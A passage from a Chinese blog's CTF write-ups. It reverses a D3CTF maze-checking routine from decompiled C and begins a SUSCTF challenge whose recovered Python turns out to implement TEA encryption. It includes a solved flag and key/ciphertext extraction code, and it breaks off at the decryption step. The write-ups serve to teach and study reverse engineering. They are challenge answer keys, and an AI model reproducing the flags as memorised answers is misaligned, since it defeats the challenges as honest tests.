class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">6</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">6</span> * i + j] &gt; <span class="number">0xF</span>u )  <span class="comment">//每一个格子的数最大为15</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">      v13 = <span class="built_in">map</span>[<span class="number">6</span> * i + j] % <span class="number">0x10</span>u / <span class="number">8</span>;</span><br><span class="line">      v21 = j;</span><br><span class="line">      v14 = <span class="built_in">map</span>[<span class="number">6</span> * i + j] % <span class="number">8u</span> / <span class="number">4</span> + v13;</span><br><span class="line">      v22 = j;</span><br><span class="line">      v15 = <span class="built_in">map</span>[<span class="number">6</span> * i + j] % <span class="number">4u</span> / <span class="number">2</span> + v14;</span><br><span class="line">      v23 = j;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">6</span> * i + j] % <span class="number">2u</span> + v15 &gt; <span class="number">2</span> )   <span class="comment">//格子数的二进制最多只有2个’1’</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">      <span class="keyword">if</span> ( !j &amp;&amp; <span class="built_in">map</span>[<span class="number">6</span> * i] % <span class="number">8u</span> / <span class="number">4</span> )  <span class="comment">//j==0: x0xx</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">      <span class="keyword">if</span> ( j == <span class="number">5</span> &amp;&amp; <span class="built_in">map</span>[<span class="number">6</span> * i + <span class="number">5</span>] % <span class="number">2u</span> )  <span class="comment">//j==5: xxx0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">      <span class="keyword">if</span> ( !i &amp;&amp; <span class="built_in">map</span>[j] % <span class="number">0x10</span>u / <span class="number">8</span> )  <span class="comment">//i==0: 0xxx</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">      <span class="keyword">if</span> ( i == <span class="number">5</span> &amp;&amp; <span class="built_in">map</span>[j + <span class="number">30</span>] % <span class="number">4u</span> / <span class="number">2</span> )  <span class="comment">//i==5: xx0x</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//第二个循环：检查sp1特定格子</span></span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; (<span class="keyword">unsigned</span> __int64)k &lt; <span class="number">3</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    sp1_x = sp1[k] / <span class="number">10</span>;  <span class="comment">//x是当前数的十位</span></span><br><span class="line">    sp1_y = sp1[k] % <span class="number">10</span>;  <span class="comment">//y是当前数的个位</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">6</span> * sp1_x + sp1_y] % <span class="number">0x10</span>u / <span class="number">8</span> &amp;&amp; <span class="built_in">map</span>[<span class="number">6</span> * sp1_x + sp1_y] % <span class="number">4u</span> / <span class="number">2</span> )  <span class="comment">//不得是1x1x</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">6</span> * sp1_x + sp1_y] % <span class="number">8u</span> / <span class="number">4</span> &amp;&amp; <span class="built_in">map</span>[<span class="number">6</span> * sp1_x + sp1_y] % <span class="number">2u</span> )  <span class="comment">//不得是x1x1</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">    v16 = <span class="built_in">map</span>[<span class="number">6</span> * sp1_x + sp1_y] % <span class="number">0x10</span>u / <span class="number">8</span>;</span><br><span class="line">    v24 = sp1_y;</span><br><span class="line">    v17 = <span class="built_in">map</span>[<span class="number">6</span> * sp1_x + sp1_y] % <span class="number">4u</span> / <span class="number">2</span> + v16;</span><br><span class="line">    v25 = sp1_y;</span><br><span class="line">    v18 = <span class="built_in">map</span>[<span class="number">6</span> * sp1_x + sp1_y] % <span class="number">2u</span> + v17;</span><br><span class="line">    v26 = sp1_y;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">6</span> * sp1_x + sp1_y] % <span class="number">8u</span> / <span class="number">4</span> + v18 != <span class="number">2</span> )  <span class="comment">//格子数的二进制必有2个’1’</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">6</span> * sp1_x + sp1_y] % <span class="number">0x10</span>u / <span class="number">8</span> )  <span class="comment">//如果当前格子为1xxx，那么上方格子与此相同</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="built_in">map</span>[<span class="number">6</span> * sp1_x - <span class="number">6</span> + sp1_y] % <span class="number">0x10</span>u / <span class="number">8</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">6</span> * sp1_x + sp1_y] % <span class="number">4u</span> / <span class="number">2</span> )  <span class="comment">//如果当前格子为xx1x，那么下方格子与此相同</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="built_in">map</span>[<span class="number">6</span> * sp1_x + <span class="number">6</span> + sp1_y] % <span class="number">4u</span> / <span class="number">2</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">6</span> * sp1_x + sp1_y] % <span class="number">8u</span> / <span class="number">4</span> )  <span class="comment">//如果当前格子为x1xx，那么左方格子与此相同</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="built_in">map</span>[<span class="number">6</span> * sp1_x - <span class="number">1</span> + sp1_y] % <span class="number">8u</span> / <span class="number">4</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">6</span> * sp1_x + sp1_y] % <span class="number">2u</span> &amp;&amp; !(<span class="built_in">map</span>[<span class="number">6</span> * sp1_x + <span class="number">1</span> + sp1_y] % <span class="number">2u</span>) )  <span class="comment">//如果当前格子为xxx1，那么右方格子与此相同</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//第三个循环：检查sp2特定格子</span></span><br><span class="line">  <span class="keyword">for</span> ( l = <span class="number">0</span>; (<span class="keyword">unsigned</span> __int64)l &lt; <span class="number">0xA</span>; ++l )</span><br><span class="line">  &#123;</span><br><span class="line">    sp2_x = sp2[l] / <span class="number">10</span>;</span><br><span class="line">    sp2_y = sp2[l] % <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (!(<span class="built_in">map</span>[<span class="number">6</span> * sp2_x + sp2_y] % <span class="number">0x10</span>u / <span class="number">8</span>) || !(<span class="built_in">map</span>[<span class="number">6</span> * sp2_x + sp2_y] % <span class="number">4u</span> / <span class="number">2</span>))</span><br><span class="line">      &amp;&amp; (!(<span class="built_in">map</span>[<span class="number">6</span> * sp2_x + sp2_y] % <span class="number">8u</span> / <span class="number">4</span>) || !(<span class="built_in">map</span>[<span class="number">6</span> * sp2_x + sp2_y] % <span class="number">2u</span>)) )</span><br><span class="line">    &#123;  <span class="comment">//只能是1x1x或者x1x1</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">6</span> * sp2_x + sp2_y] % <span class="number">0x10</span>u / <span class="number">8</span></span><br><span class="line">      &amp;&amp; <span class="built_in">map</span>[<span class="number">6</span> * sp2_x + sp2_y] % <span class="number">4u</span> / <span class="number">2</span></span><br><span class="line">      &amp;&amp; !(<span class="built_in">map</span>[<span class="number">6</span> * sp2_x - <span class="number">6</span> + sp2_y] % <span class="number">8u</span> / <span class="number">4</span>)</span><br><span class="line">      &amp;&amp; !(<span class="built_in">map</span>[<span class="number">6</span> * sp2_x - <span class="number">6</span> + sp2_y] % <span class="number">2u</span>)</span><br><span class="line">      &amp;&amp; !(<span class="built_in">map</span>[<span class="number">6</span> * sp2_x + <span class="number">6</span> + sp2_y] % <span class="number">8u</span> / <span class="number">4</span>)</span><br><span class="line">      &amp;&amp; !(<span class="built_in">map</span>[<span class="number">6</span> * sp2_x + <span class="number">6</span> + sp2_y] % <span class="number">2u</span>) )</span><br><span class="line">    &#123;  <span class="comment">//不得出现：当前格子为1x1x、上方格子为x0x0、下方格子为x0x0</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">6</span> * sp2_x + sp2_y] % <span class="number">8u</span> / <span class="number">4</span></span><br><span class="line">      &amp;&amp; <span class="built_in">map</span>[<span class="number">6</span> * sp2_x + sp2_y] % <span class="number">2u</span></span><br><span class="line">      &amp;&amp; !(<span class="built_in">map</span>[<span class="number">6</span> * sp2_x + <span class="number">1</span> + sp2_y] % <span class="number">0x10</span>u / <span class="number">8</span>)</span><br><span class="line">      &amp;&amp; !(<span class="built_in">map</span>[<span class="number">6</span> * sp2_x + <span class="number">1</span> + sp2_y] % <span class="number">4u</span> / <span class="number">2</span>)</span><br><span class="line">      &amp;&amp; !(<span class="built_in">map</span>[<span class="number">6</span> * sp2_x - <span class="number">1</span> + sp2_y] % <span class="number">0x10</span>u / <span class="number">8</span>)</span><br><span class="line">      &amp;&amp; !(<span class="built_in">map</span>[<span class="number">6</span> * sp2_x - <span class="number">1</span> + sp2_y] % <span class="number">4u</span> / <span class="number">2</span>) )</span><br><span class="line">    &#123;  <span class="comment">//不得出现：当前格子为x1x1、右方格子为0x0x、左方格子为0x0x</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//最后一轮check，要求按特定规则进行移动（当前位置map[check_x][check_y]），且不能走回头路（即将要移动的坐标!=map[last_x][last_y]），最后需要走回map[0][0]才能返回0</span></span><br><span class="line">  <span class="comment">//四个if是通过map[0][0]的值决定check_x的初值，其实do-while循环可以抽象成LABEL_79，然后四个if的意思就是init check_x + 走LABEL_79</span></span><br><span class="line">  last_x = <span class="number">0</span>;</span><br><span class="line">  last_y = <span class="number">0</span>;</span><br><span class="line">  check_x = <span class="number">0</span>;</span><br><span class="line">  check_y = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *<span class="built_in">map</span> % <span class="number">0x10</span>u / <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    check_x = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">LABEL_79:</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="built_in">map</span>[<span class="number">6</span> * check_x + check_y] % <span class="number">0x10</span>u / <span class="number">8</span>) || check_x - <span class="number">1</span> == last_x &amp;&amp; check_y == last_y )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="built_in">map</span>[<span class="number">6</span> * check_x + check_y] % <span class="number">4u</span> / <span class="number">2</span>) || check_x + <span class="number">1</span> == last_x &amp;&amp; check_y == last_y )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !(<span class="built_in">map</span>[<span class="number">6</span> * check_x + check_y] % <span class="number">8u</span> / <span class="number">4</span>) || check_x == last_x &amp;&amp; check_y - <span class="number">1</span> == last_y )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !(<span class="built_in">map</span>[<span class="number">6</span> * check_x + check_y] % <span class="number">2u</span>) || check_x == last_x &amp;&amp; check_y + <span class="number">1</span> == last_y )</span><br><span class="line">              <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">            last_x = check_x;</span><br><span class="line">            last_y = check_y++;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            last_x = check_x;</span><br><span class="line">            last_y = check_y--;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          last_x = check_x;</span><br><span class="line">          last_y = check_y;</span><br><span class="line">          ++check_x;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        last_x = check_x;</span><br><span class="line">        last_y = check_y;</span><br><span class="line">        --check_x;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( check_x || check_y );</span><br><span class="line">    result = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *<span class="built_in">map</span> % <span class="number">4u</span> / <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      check_x = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_79;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *<span class="built_in">map</span> % <span class="number">8u</span> / <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      check_y = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_79;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *<span class="built_in">map</span> % <span class="number">2u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      check_y = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_79;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">1</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从最后的check可以看出需要走一条从map[0][0]开始的回路，并且走的方向刚好跟开头用<code>1234</code>初始化map的方向对应了（并且保证了不会往回走），说明每个格子里只能有两个’1’或者没有’1’（不然就交叉路了）。</p><p>这样的话<code>sp2</code>检查要求里的“只能是1x1x或者x1x1”其实就等同于“只能是1010或者0101”了（相当于直走），<code>sp1</code>检查要求里的“不得是1x1x“、”不得x1x1”等同于“不得是1010“、”不得0101”了（相当于需要拐弯）。</p><p>推的时候还有一个需要注意的地方是赋值的两个对应位是连锁的，比如上下两个格子，无论走的方向怎么样（向上or向下），上面的格子必为xx1x，下面的格子必为1xxx；而如果上面的格子是xx0x，那么下面的格子也必为0xxx。</p><p>map[0][0]由第一个循环可以推出为00xx，由sp1的要求（必有两个’1’）推出为0011，四个if里只会走check_x&#x3D;1和check_y&#x3D;1的if，而如果在走check_x&#x3D;1的if就达成回路的话就不必走后面的。</p><p>而最开始限定了flag的开始是<code>dectf&#123;2</code>，也就是从2向下走开始，也就走check_x&#x3D;1。</p><p>最后就手推地图，其中紫色的数字是正推确定的，草绿色的箭头是正走推；深绿色的数字和箭头是倒推确定的。用蓝色标出了sp1的格子，用橙色标出了sp2的格子。</p><p><img src="/p/wpFor-2022D3CTF/image-20220309171930972.png"></p><p>拿到flag：<strong>d3ctf{22441442223133324424441111133333}</strong></p><p>（有个sp2上下格子的条件没用过就离谱x</p><p><img src="/p/wpFor-2022D3CTF/image-20220309172852552.png"></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2022SUSCTF</title>
      <link href="p/wpFor-2022SUSCTF/"/>
      <url>p/wpFor-2022SUSCTF/</url>
      
        <content type="html"><![CDATA[<p>逆向手终于来整理逆向啦（喜大普奔，可能会有其他两个逆向题的复现+1？</p><p>有幸苟在Top14，队友们tql！</p><a id="more"></a><p><img src="/p/wpFor-2022SUSCTF/640.png" alt="图片"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="DigitalCircuits"><a href="#DigitalCircuits" class="headerlink" title="DigitalCircuits"></a>DigitalCircuits</h2><p>exe典型pyinstaller打包，甚至图标都没改（</p><p>按照 <a href="https://c10udlnk.top/p/reSkillsOn-Pyinstaller-extracted-to-python/">RE套路 - 关于pyinstaller打包文件的复原</a> 解出来python源码，然后读代码的过程中顺便给一些函数命了名（便于分析）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myand</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> b == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> b == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mynot</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myxor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> myor(myand(a, mynot(b)), myand(mynot(a), b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myadd</span>(<span class="params">x, y, z</span>):</span></span><br><span class="line">    s = myxor(myxor(x, y), z)</span><br><span class="line">    c = myor(myand(x, y), myand(z, myor(x, y)))</span><br><span class="line">    <span class="keyword">return</span> (s, c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    z = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    a = a[::<span class="number">-1</span>]</span><br><span class="line">    b = b[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        ans += myadd(a[i], b[i], z)[<span class="number">0</span>]</span><br><span class="line">        z = myadd(a[i], b[i], z)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> ans[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shl</span>(<span class="params">a, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a[n:] + <span class="string">&#x27;0&#x27;</span> * n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shr</span>(<span class="params">a, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> n * <span class="string">&#x27;0&#x27;</span> + a[:-n]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        ans += myxor(a[i], b[i])</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f10</span>(<span class="params">v0, v1, k0, k1, k2, k3</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;00000000000000000000000000000000&#x27;</span></span><br><span class="line">    d = <span class="string">&#x27;10011110001101110111100110111001&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        s = add(s, d)</span><br><span class="line">        v0 = add(v0, xor(xor(add(shl(v1, <span class="number">4</span>), k0), add(v1, s)), add(shr(v1, <span class="number">5</span>), k1)))</span><br><span class="line">        v1 = add(v1, xor(xor(add(shl(v0, <span class="number">4</span>), k2), add(v0, s)), add(shr(v0, <span class="number">5</span>), k3)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v0 + v1</span><br><span class="line"></span><br><span class="line">k0 = <span class="string">&#x27;0100010001000101&#x27;</span>.zfill(<span class="number">32</span>)</span><br><span class="line">k1 = <span class="string">&#x27;0100000101000100&#x27;</span>.zfill(<span class="number">32</span>)</span><br><span class="line">k2 = <span class="string">&#x27;0100001001000101&#x27;</span>.zfill(<span class="number">32</span>)</span><br><span class="line">k3 = <span class="string">&#x27;0100010101000110&#x27;</span>.zfill(<span class="number">32</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;please input flag:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">0</span>:<span class="number">7</span>] != <span class="string">&#x27;SUSCTF&#123;&#x27;</span> <span class="keyword">or</span> flag[(<span class="number">-1</span>)] != <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;Error!!!The formate of flag is SUSCTF&#123;XXX&#125;&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">flagstr = flag[<span class="number">7</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flagstr) != <span class="number">24</span>:</span><br><span class="line">    print(<span class="string">&#x27;Error!!!The length of flag 24&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flagstr), <span class="number">8</span>):</span><br><span class="line">        v0 = flagstr[i:i + <span class="number">4</span>]</span><br><span class="line">        v0 = <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[i]))[<span class="number">2</span>:].zfill(<span class="number">8</span>) + <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[(i + <span class="number">1</span>)]))[<span class="number">2</span>:].zfill(<span class="number">8</span>) + <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[(i + <span class="number">2</span>)]))[<span class="number">2</span>:].zfill(<span class="number">8</span>) + <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[(i + <span class="number">3</span>)]))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        v1 = <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[(i + <span class="number">4</span>)]))[<span class="number">2</span>:].zfill(<span class="number">8</span>) + <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[(i + <span class="number">5</span>)]))[<span class="number">2</span>:].zfill(<span class="number">8</span>) + <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[(i + <span class="number">6</span>)]))[<span class="number">2</span>:].zfill(<span class="number">8</span>) + <span class="built_in">bin</span>(<span class="built_in">ord</span>(flagstr[(i + <span class="number">7</span>)]))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        res += f10(v0, v1, k0, k1, k2, k3)</span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">&#x27;001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;True&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;False&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>从前三个函数开始分析出与门、或门和非门，剩下的根据数电&#x2F;离散学的一些知识来推（比如<code>myadd</code>这里是一个全加器，返回进位c和结果s）。</p><p>分析完以后可以发现f10其实就是个原版TEA，魔数都不带改的那种（u1s1看到这四个<code>kx = &#39;...&#39;.zfill(32)</code>就有猜到是TEA系列了hhh</p><p>key是k0-k3，密文是res，明文就是我们要的flag</p><p>用python把密钥和密文处理一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">&#x27;001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111&#x27;</span></span><br><span class="line">dst = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(res), <span class="number">32</span>):</span><br><span class="line">    dst.append(<span class="built_in">int</span>(res[i:i+<span class="number">32</span>], <span class="number">2</span>))</span><br><span class="line">print(dst)</span><br><span class="line"></span><br><span class="line">k = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">k[<span class="number">0</span>] = <span class="string">&#x27;0100010001000101&#x27;</span>.zfill(<span class="number">32</span>)</span><br><span class="line">k[<span class="number">1</span>] = <span class="string">&#x27;0100000101000100&#x27;</span>.zfill(<span class="number">32</span>)</span><br><span class="line">k[<span class="number">2</span>] = <span class="string">&#x27;0100001001000101&#x27;</span>.zfill(<span class="number">32</span>)</span><br><span class="line">k[<span class="number">3</span>] = <span class="string">&#x27;0100010101000110&#x27;</span>.zfill(<span class="number">32</span>)</span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> k:</span><br><span class="line">    key.append(<span class="built_in">int</span>(x, <span class="number">2</span>))</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>从 <a href="https://www.jianshu.com/p/4272e0805da3">TEA、XTEA、XXTEA加密解密算法</a> 抄一个tea解密，改一下main函数（需要注意一下flag塞进去的顺序）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 